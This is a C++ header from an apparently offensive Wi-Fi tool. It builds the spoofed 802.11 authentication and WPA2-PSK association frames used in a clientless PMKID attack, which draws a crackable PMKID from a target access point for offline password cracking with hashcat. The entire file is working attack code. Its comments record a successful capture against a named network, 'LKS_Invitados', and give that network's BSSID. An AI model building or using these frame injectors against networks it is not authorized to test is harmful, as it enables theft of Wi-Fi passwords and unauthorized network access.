#pragma once

#include <stddef.h>
#include <stdint.h>
#include <string.h>

/**
 * @file pmkid_solicit.h
 * @brief Pure 802.11 frame builders for clientless PMKID solicitation (ADR-0137, ADR-0138).
 *
 * Builds the open-authentication request and the WPA2-PSK association request that, injected
 * at a PMKID-capable AP from a chosen station MAC, draw an EAPOL M1 carrying a PMKID KDE. The
 * promiscuous RX path then records that PMKID keyed on our chosen STA MAC (the correct hashcat
 * STA for this path). Split out of the feasibility spike into utils/ so the byte layout is
 * unit-testable on the native host like pmkid_utils: the capture .cpp is not in the native
 * build_src_filter, but utils/ headers are, and these builders are pure (no radio, no Arduino).
 *
 * The exact bytes here are the frames that drew M1 on-device on 2026-11-04 (ADR-0138): AP
 * LKS_Invitados 14:ab:02:01:a7:d2, STA 02:ad:5a:11:ed:01. The device shell only transmits
 * them; the request/response timing (blind pair, ~25 ms apart) lives in HandshakeCapture.
 */

namespace adversary {
namespace utils {

// Largest frame either builder emits is the association request with a 32-byte SSID:
// header(24) + capability(2) + listen(2) + SSID IE(2+32) + rates IE(2+8) + RSN IE(2+20) = 96.
// Callers size their TX buffer to this so a build never has to be bounds-checked at the call.
constexpr uint16_t SOLICIT_FRAME_BUF_LEN = 128;

// Fixed on-wire lengths, so callers and tests do not hardcode them.
constexpr uint16_t SOLICIT_AUTH_FRAME_LEN = 30;   // open-auth request: no variable fields
constexpr uint8_t SOLICIT_SSID_MAX_LEN = 32;      // 802.11 SSID element cap

// 802.11 frame-control first byte (version 0). Second byte (flags) is 0 for both: an injected
// request from a station we spoof, no ToDS/FromDS.
constexpr uint8_t FC0_MGMT_AUTH = 0xB0;       // type management, subtype authentication (11)
constexpr uint8_t FC0_MGMT_ASSOC_REQ = 0x00; // type management, subtype association request (0)

// RSN information element: one pairwise cipher (CCMP) and one AKM (PSK), the suite a
// PMK-caching WPA2-PSK AP answers with an M1 PMKID KDE.
constexpr uint8_t RSN_IE_TAG = 0x30;
constexpr uint8_t RSN_OUI_0 = 0x00, RSN_OUI_1 = 0x0F, RSN_OUI_2 = 0xAC; // 00-0F-AC
constexpr uint8_t RSN_CIPHER_CCMP = 0x04;
constexpr uint8_t RSN_AKM_PSK = 0x02;

constexpr uint8_t SSID_IE_TAG = 0x00;
constexpr uint8_t RATES_IE_TAG = 0x01;

// Locally administered, unicast spoofed station MAC we solicit from: first octet 0x02 sets the
// locally-administered bit and clears the multicast bit. Distinct from our interface MACs so
// the driver does not claim the AP's replies while promiscuous still delivers them, which makes
// a PMKID recorded against this MAC unambiguously the product of solicitation, not a real client.
inline const uint8_t* defaultSolicitStaMac() {
    static const uint8_t mac[6] = {0x02, 0xAD, 0x5A, 0x11, 0xED, 0x01};
    return mac;
}

/**
 * @brief Build an open-system authentication request (transaction sequence 1).
 *
 * @param buf    Output buffer.
 * @param bufLen Capacity of @p buf.
 * @param bssid  Target AP BSSID (addr1 and addr3).
 * @param src    Spoofed station MAC (addr2).
 * @return Frame length (SOLICIT_AUTH_FRAME_LEN), or 0 if any pointer is null or @p buf is too
 *         small. Returning 0 lets the caller fail loud instead of transmitting a short frame.
 */
inline uint16_t buildAuthRequest(uint8_t* buf, size_t bufLen,
                                 const uint8_t* bssid, const uint8_t* src) {
    if (buf == nullptr || bssid == nullptr || src == nullptr) return 0;
    if (bufLen < SOLICIT_AUTH_FRAME_LEN) return 0;

    uint16_t n = 0;
    buf[n++] = FC0_MGMT_AUTH; buf[n++] = 0x00;  // frame control
    buf[n++] = 0x00; buf[n++] = 0x00;           // duration
    memcpy(buf + n, bssid, 6); n += 6;          // addr1 = AP
    memcpy(buf + n, src, 6);   n += 6;          // addr2 = us (spoofed STA)
    memcpy(buf + n, bssid, 6); n += 6;          // addr3 = BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;           // sequence control
    buf[n++] = 0x00; buf[n++] = 0x00;           // auth algorithm = open system
    buf[n++] = 0x01; buf[n++] = 0x00;           // auth transaction sequence = 1
    buf[n++] = 0x00; buf[n++] = 0x00;           // status code = 0
    return n;
}

/**
 * @brief Build a WPA2-PSK association request: SSID + supported rates + RSN IE (CCMP/CCMP/PSK).
 *
 * @param buf    Output buffer.
 * @param bufLen Capacity of @p buf.
 * @param bssid  Target AP BSSID (addr1 and addr3).
 * @param src    Spoofed station MAC (addr2).
 * @param ssid   Target SSID (clamped to SOLICIT_SSID_MAX_LEN octets).
 * @return Frame length, or 0 if any pointer is null or @p buf cannot hold the built frame.
 */
inline uint16_t buildAssocRequest(uint8_t* buf, size_t bufLen, const uint8_t* bssid,
                                  const uint8_t* src, const char* ssid) {
    if (buf == nullptr || bssid == nullptr || src == nullptr || ssid == nullptr) return 0;

    const uint8_t ssidLen = static_cast<uint8_t>(strnlen(ssid, SOLICIT_SSID_MAX_LEN));
    // header(24) + cap(2) + listen(2) + SSID(2+ssidLen) + rates(2+8) + RSN(2+20).
    const size_t required = 24 + 2 + 2 + (2 + ssidLen) + (2 + 8) + (2 + 20);
    if (bufLen < required) return 0;

    uint16_t n = 0;
    buf[n++] = FC0_MGMT_ASSOC_REQ; buf[n++] = 0x00;  // frame control
    buf[n++] = 0x00; buf[n++] = 0x00;                // duration
    memcpy(buf + n, bssid, 6); n += 6;               // addr1 = AP
    memcpy(buf + n, src, 6);   n += 6;               // addr2 = us (spoofed STA)
    memcpy(buf + n, bssid, 6); n += 6;               // addr3 = BSSID
    buf[n++] = 0x00; buf[n++] = 0x00;                // sequence control

    buf[n++] = 0x11; buf[n++] = 0x00;                // capability info: ESS + Privacy
    buf[n++] = 0x0a; buf[n++] = 0x00;                // listen interval

    buf[n++] = SSID_IE_TAG; buf[n++] = ssidLen;      // SSID element
    memcpy(buf + n, ssid, ssidLen); n += ssidLen;

    buf[n++] = RATES_IE_TAG; buf[n++] = 0x08;        // supported rates: 1,2,5.5,11,6,9,12,18
    buf[n++] = 0x82; buf[n++] = 0x84; buf[n++] = 0x8b; buf[n++] = 0x96;
    buf[n++] = 0x0c; buf[n++] = 0x12; buf[n++] = 0x18; buf[n++] = 0x24;

    buf[n++] = RSN_IE_TAG; buf[n++] = 0x14;          // RSN IE, length 20
    buf[n++] = 0x01; buf[n++] = 0x00;                // version 1
    buf[n++] = RSN_OUI_0; buf[n++] = RSN_OUI_1; buf[n++] = RSN_OUI_2; buf[n++] = RSN_CIPHER_CCMP;  // group CCMP
    buf[n++] = 0x01; buf[n++] = 0x00;                // pairwise count 1
    buf[n++] = RSN_OUI_0; buf[n++] = RSN_OUI_1; buf[n++] = RSN_OUI_2; buf[n++] = RSN_CIPHER_CCMP;  // pairwise CCMP
    buf[n++] = 0x01; buf[n++] = 0x00;                // AKM count 1
    buf[n++] = RSN_OUI_0; buf[n++] = RSN_OUI_1; buf[n++] = RSN_OUI_2; buf[n++] = RSN_AKM_PSK;       // AKM PSK
    buf[n++] = 0x00; buf[n++] = 0x00;                // RSN capabilities
    return n;
}

} // namespace utils
} // namespace adversary
